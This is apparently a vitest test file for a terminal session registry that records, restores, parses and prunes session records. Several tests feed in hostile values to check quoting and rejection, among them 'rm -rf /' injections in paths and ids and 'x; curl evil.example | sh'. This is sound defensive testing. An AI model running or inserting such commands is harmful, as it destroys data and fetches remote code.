import { describe, expect, it } from "vitest";
import {
	closeRecord,
	lastOpenAt,
	lastOpenOnQuest,
	markSignalled,
	openRecord,
	parseSessionRecord,
	pruneRecords,
	recentlyClosed,
	reopenRecord,
	restorable,
	restoreRecipe,
	type SessionRecord,
	switchQuest,
} from "../../../../lib/internal/quest/session-registry";

const NOW = new Date("2026-07-28T18:00:00.000Z");
const LATER = new Date("2026-07-28T19:00:00.000Z");
const LATER_STILL = new Date("2026-07-28T20:00:00.000Z");

function opened(overrides: Partial<Parameters<typeof openRecord>[0]> = {}) {
	return openRecord({
		sessionId: "sess-1",
		instanceId: "inst-1",
		cwd: "/work",
		questId: "QEST-1",
		now: NOW,
		...overrides,
	});
}

describe("openRecord", () => {
	it("records the session as open on its quest", () => {
		const record: SessionRecord = opened();
		expect(record).toMatchObject({
			sessionId: "sess-1",
			instanceId: "inst-1",
			cwd: "/work",
			quest: "QEST-1",
			openedAt: NOW.toISOString(),
		});
		expect(record.closedAt).toBeUndefined();
	});

	it("carries the probeable identity a later reader needs", () => {
		const process = {
			hostId: "host-a",
			pid: 42,
			startToken: "tok",
			bootToken: "boot-1",
		};
		const terminal = {
			driverId: "wezterm",
			kind: "wezterm-pane",
			hostId: "host-a",
			scope: "/sock/1",
			value: "7",
		};
		const record = opened({ process, terminal });
		expect(record.process).toEqual(process);
		expect(record.terminal).toEqual(terminal);
	});

	it("omits identity a session could not capture rather than inventing it", () => {
		const record = opened();
		expect("process" in record).toBe(false);
		expect("terminal" in record).toBe(false);
	});
});

describe("closeRecord", () => {
	it("stamps a session whose tab went away with it", () => {
		const record = closeRecord(opened(), "quit", LATER);
		expect(record.closedAt).toBe(LATER.toISOString());
		expect(record.endReason).toBe("quit");
	});

	it("stamps a session swapped out of a tab that is still open", () => {
		// A reload, a session switch or a fork ends the conversation
		// without ending the tab, and only the tab's fate differs.
		const record = closeRecord(opened(), "swapped", LATER);
		expect(record.closedAt).toBe(LATER.toISOString());
		expect(record.endReason).toBe("swapped");
	});

	it("leaves an already-closed record where it stands", () => {
		// A late heartbeat or a second shutdown must not move the moment
		// the session actually ended.
		const first = closeRecord(opened(), "quit", LATER);
		const again = closeRecord(first, "swapped", LATER_STILL);
		expect(again.closedAt).toBe(LATER.toISOString());
		expect(again.endReason).toBe("quit");
	});
});

describe("markSignalled", () => {
	it("stamps a session its terminal or the machine took away", () => {
		const record = markSignalled(opened(), LATER);
		expect(record.closedAt).toBe(LATER.toISOString());
		expect(record.endReason).toBe("signalled");
	});

	it("overrides the quit pi reports for the same signal", () => {
		// pi turns SIGHUP into a shutdown whose reason is quit, and that
		// stamp usually lands first. It is pi's name for this signal, not
		// a decision anyone made, so the signal's stamp replaces it.
		const quit = closeRecord(opened(), "quit", LATER);
		const record = markSignalled(quit, LATER_STILL);
		expect(record.endReason).toBe("signalled");
		expect(record.closedAt).toBe(LATER.toISOString());
	});

	it("keeps the first signal when a second one arrives", () => {
		// A busy tab hears SIGHUP twice, once from the shell and once
		// from the terminal, and the end is the first of them.
		const first = markSignalled(opened(), LATER);
		expect(markSignalled(first, LATER_STILL)).toEqual(first);
	});

	it("leaves an ending it has no reason to doubt", () => {
		for (const reason of ["died", "swapped", "vanished"] as const) {
			const ended = closeRecord(opened(), reason, LATER);
			expect(markSignalled(ended, LATER_STILL)).toEqual(ended);
		}
	});
});

describe("restoreRecipe", () => {
	it("gives a runnable line per session", () => {
		expect(restoreRecipe([opened()])).toEqual([
			"(cd '/work' && pi --session 'sess-1')  # QEST-1",
		]);
	});

	it("quotes a path that would otherwise break out and run", () => {
		// The recipe is pasted into a shell. A directory holding a quote
		// must stay an argument rather than becoming a command.
		const line = restoreRecipe([opened({ cwd: "/tmp/it's here'; rm -rf /" })]);
		expect(line[0]).toBe(
			"(cd '/tmp/it'\\''s here'\\''; rm -rf /' && pi --session 'sess-1')  # QEST-1",
		);
	});

	it("keeps a newline out of the trailing comment", () => {
		// A newline would end the comment and turn the rest of the line
		// into a live command.
		const line = restoreRecipe([opened({ questId: "QEST-1\nrm -rf /" })]);
		expect(line[0]).not.toContain("\n");
	});
});

describe("restorable", () => {
	const died = (sessionId: string, at: Date) =>
		closeRecord(opened({ sessionId }), "died", at);

	it("offers back a session that ended without anyone asking", () => {
		expect(restorable([died("sess-1", LATER)]).map((r) => r.sessionId)).toEqual(
			["sess-1"],
		);
	});

	it("offers back a session its terminal or the machine took away", () => {
		// Closing a tab, WezTerm dying or quitting, and a shutdown all
		// reach pi as a signal. None of them is the user closing pi.
		const signalled = markSignalled(opened({ sessionId: "sess-hup" }), LATER);
		expect(restorable([signalled]).map((r) => r.sessionId)).toEqual([
			"sess-hup",
		]);
	});

	it("puts signalled and died sessions in one order, newest first", () => {
		const order = restorable([
			died("crashed", LATER),
			markSignalled(opened({ sessionId: "hung-up" }), LATER_STILL),
		]);
		expect(order.map((r) => r.sessionId)).toEqual(["hung-up", "crashed"]);
	});

	it("never offers a session the user closed on purpose", () => {
		// Quitting a tab is an instruction, not an accident. Offering it
		// back is how restore came to propose tabs nobody wanted.
		const quit = closeRecord(opened({ sessionId: "sess-quit" }), "quit", LATER);
		expect(restorable([quit])).toEqual([]);
	});

	it("never offers a session it only adopted", () => {
		// A tab that predates the registry has no shutdown hook, so its
		// clean exit stamps nothing and a reader finds only that the
		// process is gone. Calling that a crash offers back tabs the
		// user closed on purpose, which is the failure this replaces.
		const vanished = closeRecord(
			opened({ sessionId: "sess-adopted" }),
			"vanished",
			LATER,
		);
		expect(restorable([vanished])).toEqual([]);
	});

	it("never offers a session whose tab outlived it", () => {
		// A swap replaced the conversation in a tab that is still on
		// screen, so there is nothing to bring back.
		const swapped = closeRecord(
			opened({ sessionId: "sess-swapped" }),
			"swapped",
			LATER,
		);
		expect(restorable([swapped])).toEqual([]);
	});

	it("never offers a session that is still open", () => {
		expect(restorable([opened({ sessionId: "sess-open" })])).toEqual([]);
	});

	it("never offers a session already brought back", () => {
		const back = reopenRecord(died("sess-1", LATER), { instanceId: "inst-2" });
		expect(restorable([back])).toEqual([]);
	});

	it("puts the most recently lost first", () => {
		const order = restorable([
			died("older", LATER),
			died("newer", LATER_STILL),
		]);
		expect(order.map((r) => r.sessionId)).toEqual(["newer", "older"]);
	});
});

describe("recentlyClosed", () => {
	const WINDOW = { now: LATER_STILL, withinHours: 24 };
	const ended = (
		sessionId: string,
		reason: "quit" | "swapped" | "died" | "vanished",
		at: Date,
	) => closeRecord(opened({ sessionId }), reason, at);

	it("lists a session the user quit, in case they want it back", () => {
		// Restore leaves a quit alone, and pi calls some signals a quit
		// too, so a tab taken away can still end up here. Showing the
		// recent ones keeps it one line away rather than lost.
		const ids = recentlyClosed([ended("sess-quit", "quit", LATER)], WINDOW).map(
			(r) => r.sessionId,
		);
		expect(ids).toEqual(["sess-quit"]);
	});

	it("lists an adopted session that went, since nobody saw how", () => {
		const ids = recentlyClosed(
			[ended("sess-gone", "vanished", LATER)],
			WINDOW,
		).map((r) => r.sessionId);
		expect(ids).toEqual(["sess-gone"]);
	});

	it("leaves out what restore already offers, and what never closed a tab", () => {
		const records = [
			opened({ sessionId: "sess-open" }),
			ended("sess-died", "died", LATER),
			markSignalled(opened({ sessionId: "sess-hup" }), LATER),
			ended("sess-swapped", "swapped", LATER),
		];
		expect(recentlyClosed(records, WINDOW)).toEqual([]);
	});

	it("leaves out a session closed before the window", () => {
		const longAgo = new Date(LATER_STILL.getTime() - 25 * 3_600_000);
		expect(
			recentlyClosed([ended("sess-old", "quit", longAgo)], WINDOW),
		).toEqual([]);
	});

	it("puts the most recently closed first", () => {
		const ids = recentlyClosed(
			[ended("older", "quit", LATER), ended("newer", "quit", LATER_STILL)],
			WINDOW,
		).map((r) => r.sessionId);
		expect(ids).toEqual(["newer", "older"]);
	});
});

describe("reopenRecord", () => {
	const resumed = {
		instanceId: "inst-2",
		process: { hostId: "host-a", pid: 222, startToken: "tok-2" },
	};

	it("puts a session that was resumed back in the open set", () => {
		// Restore offers back the tabs that died. One the user has
		// already brought back must stop being offered, and the only
		// thing that says so is its record joining the open set again.
		const died = closeRecord(opened(), "died", LATER);
		const back = reopenRecord(died, resumed);
		expect(back.closedAt).toBeUndefined();
		expect(back.endReason).toBeUndefined();
	});

	it("takes on the identity of the process now running it", () => {
		// The old pid belongs to a dead process, and after a reboot to
		// whatever inherited the number. Probing it would answer about a
		// stranger, so the resumed session's own identity replaces it.
		const died = closeRecord(opened(), "died", LATER);
		const back = reopenRecord(died, resumed);
		expect(back.instanceId).toBe("inst-2");
		expect(back.process).toEqual(resumed.process);
	});

	it("remembers how the session ended before it was resumed", () => {
		// Without this, a session brought back after a crash reads as if
		// it had never ended, and a later question about why restore did
		// or did not offer it has nothing left to go on.
		const died = closeRecord(opened(), "died", LATER);
		expect(reopenRecord(died, resumed).endings).toEqual([
			{ closedAt: LATER.toISOString(), endReason: "died" },
		]);
	});

	it("adds each later ending after the earlier ones", () => {
		const first = reopenRecord(closeRecord(opened(), "died", LATER), resumed);
		const second = reopenRecord(markSignalled(first, LATER_STILL), resumed);
		expect(second.endings?.map((e) => e.endReason)).toEqual([
			"died",
			"signalled",
		]);
	});

	it("keeps only the most recent endings", () => {
		// A tab resumed every morning for months should not grow its
		// record without limit.
		let record = opened();
		for (let i = 0; i < 12; i++) {
			const at = new Date(NOW.getTime() + (i + 1) * 60_000);
			record = reopenRecord(closeRecord(record, "quit", at), resumed);
		}
		expect(record.endings).toHaveLength(10);
		expect(record.endings?.[9]?.closedAt).toBe(
			new Date(NOW.getTime() + 12 * 60_000).toISOString(),
		);
	});

	it("records nothing for a session that had not ended", () => {
		expect(reopenRecord(opened(), resumed).endings).toBeUndefined();
	});

	it("keeps the moment the session first opened", () => {
		// Resuming continues a session rather than starting one, so its
		// origin is still its origin.
		const died = closeRecord(opened(), "died", LATER);
		expect(reopenRecord(died, resumed).openedAt).toBe(NOW.toISOString());
	});

	it("forgets an identity the resuming process could not capture", () => {
		// Carrying the old process forward would leave the record
		// probeable against a pid that is not this session's.
		const died = closeRecord(
			opened({ process: resumed.process }),
			"died",
			LATER,
		);
		expect(
			reopenRecord(died, { instanceId: "inst-3" }).process,
		).toBeUndefined();
	});
});

describe("parseSessionRecord", () => {
	it("reads back a record it wrote", () => {
		const record = closeRecord(
			switchQuest(opened(), "QEST-2", LATER),
			"quit",
			LATER_STILL,
		);
		const round = parseSessionRecord(JSON.parse(JSON.stringify(record)));
		expect(round).toEqual(record);
	});

	it("reads back the endings of a session resumed before", () => {
		const record = reopenRecord(closeRecord(opened(), "died", LATER), {
			instanceId: "inst-2",
		});
		const round = parseSessionRecord(JSON.parse(JSON.stringify(record)));
		expect(round).toEqual(record);
	});

	it("refuses endings it cannot read", () => {
		const base = JSON.parse(JSON.stringify(opened()));
		for (const endings of [
			"died",
			[{ closedAt: LATER.toISOString(), endReason: "evaporated" }],
			[{ endReason: "died" }],
		]) {
			expect(parseSessionRecord({ ...base, endings })).toBeUndefined();
		}
	});

	it("reads back a session a signal took away", () => {
		const record = markSignalled(opened(), LATER);
		const round = parseSessionRecord(JSON.parse(JSON.stringify(record)));
		expect(round).toEqual(record);
	});

	it("refuses a session id that could act as more than a name", () => {
		// Restore types the id into a live shell to resume it. A record
		// is a file on disk, so anything able to write one could reach
		// the terminal through it. An id is an identifier or it is not a
		// record.
		for (const sessionId of [
			"x; curl evil.example | sh",
			"x $(whoami)",
			"x`id`",
			"x&&reboot",
			"../../escape",
			"x\nrm -rf /",
			"",
		]) {
			expect(
				parseSessionRecord({
					...JSON.parse(JSON.stringify(opened())),
					sessionId,
				}),
			).toBeUndefined();
		}
	});

	it("refuses a record missing the fields every reader depends on", () => {
		expect(parseSessionRecord({ sessionId: "sess-1" })).toBeUndefined();
		expect(parseSessionRecord(null)).toBeUndefined();
		expect(parseSessionRecord("sess-1")).toBeUndefined();
	});

	it("refuses a record whose end reason is not one we understand", () => {
		// A record we cannot interpret must not be treated as ended, since
		// that decides whether a tab is offered back to the user.
		const record = {
			...opened(),
			closedAt: LATER.toISOString(),
			endReason: "evaporated",
		};
		expect(parseSessionRecord(record)).toBeUndefined();
	});
});

describe("pruneRecords", () => {
	const day = (n: number) =>
		new Date(`2026-07-${String(n).padStart(2, "0")}T18:00:00.000Z`);

	it("forgets a session closed longer ago than the window", () => {
		const old = closeRecord(opened({ sessionId: "old" }), "quit", day(1));
		const { kept, dropped } = pruneRecords([old], {
			now: day(20),
			retentionDays: 14,
		});
		expect(kept).toEqual([]);
		expect(dropped.map((r) => r.sessionId)).toEqual(["old"]);
	});

	it("keeps a session closed inside the window", () => {
		const recent = closeRecord(
			opened({ sessionId: "recent" }),
			"quit",
			day(18),
		);
		const { kept, dropped } = pruneRecords([recent], {
			now: day(20),
			retentionDays: 14,
		});
		expect(kept.map((r) => r.sessionId)).toEqual(["recent"]);
		expect(dropped).toEqual([]);
	});

	it("never forgets a session it cannot prove has ended", () => {
		// No close stamp means it may still be running, or it crashed and
		// no reader has repaired it yet. Either way it is recoverable,
		// and dropping it would lose a tab.
		const stillOpen = opened({ sessionId: "open" });
		const { kept, dropped } = pruneRecords([stillOpen], {
			now: day(28),
			retentionDays: 1,
		});
		expect(kept.map((r) => r.sessionId)).toEqual(["open"]);
		expect(dropped).toEqual([]);
	});

	it("keeps a session closed exactly on the window's edge", () => {
		const edge = closeRecord(opened({ sessionId: "edge" }), "quit", day(6));
		const { kept } = pruneRecords([edge], {
			now: day(20),
			retentionDays: 14,
		});
		expect(kept.map((r) => r.sessionId)).toEqual(["edge"]);
	});
});

describe("switchQuest", () => {
	it("moves the session and stamps when it left the old quest", () => {
		const record = switchQuest(opened(), "QEST-2", LATER);
		expect(record.quest).toBe("QEST-2");
		expect(record.previousQuests).toEqual({ "QEST-1": LATER.toISOString() });
	});

	it("stamps the quest it left when a session unloads to none", () => {
		const record = switchQuest(opened(), undefined, LATER);
		expect(record.quest).toBeUndefined();
		expect(record.previousQuests).toEqual({ "QEST-1": LATER.toISOString() });
	});

	it("keeps the earlier departure when a session returns and leaves again", () => {
		const left = switchQuest(opened(), "QEST-2", LATER);
		const back = switchQuest(left, "QEST-1", LATER_STILL);
		expect(back.quest).toBe("QEST-1");
		// It is on QEST-1 again, so QEST-1 is no longer a past quest,
		// and QEST-2 now carries the moment it was left.
		expect(back.previousQuests).toEqual({
			"QEST-2": LATER_STILL.toISOString(),
		});
	});

	it("does nothing when the session reloads the quest it is already on", () => {
		expect(switchQuest(opened(), "QEST-1", LATER)).toEqual(opened());
	});
});

describe("lastOpenOnQuest", () => {
	it("dates the quest a live session is on now as open", () => {
		expect(
			lastOpenOnQuest(opened(), "QEST-1", { live: true }, LATER_STILL),
		).toEqual({ at: LATER_STILL.toISOString(), exact: true });
	});

	it("dates a quest the session has left by when it left", () => {
		// The session is still open, but it is doing QEST-2's work now,
		// so QEST-1 should not claim it as currently open.
		const record = switchQuest(opened(), "QEST-2", LATER);
		expect(
			lastOpenOnQuest(record, "QEST-1", { live: true }, LATER_STILL),
		).toEqual({ at: LATER.toISOString(), exact: true });
	});

	it("says nothing about a quest the session was never on", () => {
		expect(
			lastOpenOnQuest(opened(), "QEST-9", { live: true }, LATER_STILL),
		).toBeUndefined();
	});
});

describe("lastOpenAt", () => {
	it("reads a live session as open right now", () => {
		expect(
			lastOpenAt(opened(), { live: true, heartbeatAt: "stale" }, LATER_STILL),
		).toEqual({ at: LATER_STILL.toISOString(), exact: true });
	});

	it("reads a cleanly ended session from its close stamp", () => {
		const record = closeRecord(opened(), "quit", LATER);
		expect(lastOpenAt(record, { live: false }, LATER_STILL)).toEqual({
			at: LATER.toISOString(),
			exact: true,
		});
	});

	it("dates a session that died without a close from its heartbeat", () => {
		// Nothing stamped this one, so the last time anything saw it
		// alive is the best answer available, and it is approximate.
		expect(
			lastOpenAt(
				opened(),
				{ live: false, heartbeatAt: LATER.toISOString() },
				LATER_STILL,
			),
		).toEqual({ at: LATER.toISOString(), exact: false });
	});

	it("falls back to when it opened if it never even heartbeat", () => {
		expect(lastOpenAt(opened(), { live: false }, LATER_STILL)).toEqual({
			at: NOW.toISOString(),
			exact: false,
		});
	});

	it("dates a record closed by a reader that found it gone as approximate", () => {
		// Nobody watched this one die; a reader stamped it with the last
		// moment anything saw it alive, so the stamp is a best estimate
		// even though it is recorded like any other close.
		const record = closeRecord(opened(), "died", LATER);
		expect(lastOpenAt(record, { live: false }, LATER_STILL)).toEqual({
			at: LATER.toISOString(),
			exact: false,
		});
	});

	it("prefers the close stamp over a heartbeat that outlived it", () => {
		// The heartbeat's own file is touched as the process winds down,
		// so an mtime a moment past the close is normal and must not
		// displace the exact answer.
		const record = closeRecord(opened(), "quit", LATER);
		expect(
			lastOpenAt(
				record,
				{ live: false, heartbeatAt: LATER_STILL.toISOString() },
				LATER_STILL,
			),
		).toEqual({ at: LATER.toISOString(), exact: true });
	});
});
